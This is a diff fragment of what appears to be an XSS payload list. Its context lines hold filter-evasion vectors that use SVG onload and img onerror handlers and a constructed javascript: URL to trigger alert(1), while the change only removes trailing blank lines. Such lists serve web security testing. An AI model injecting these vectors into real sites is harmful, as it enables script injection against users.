@@ -295,8 +295,3 @@ ${alert(1)}`<javas/
 onmouseover=location=tagName+innerHTML+previousSibling.nodeValue>cript:`hoverme!
 <svg id=<img/src/onerror&#61alert(1)&gt; onload=head.innerHTML=id>
 <svg id=<img/src/onerror&#61alert(1)&gt; onload=body.outerHTML=id>
-
-
-
-
-
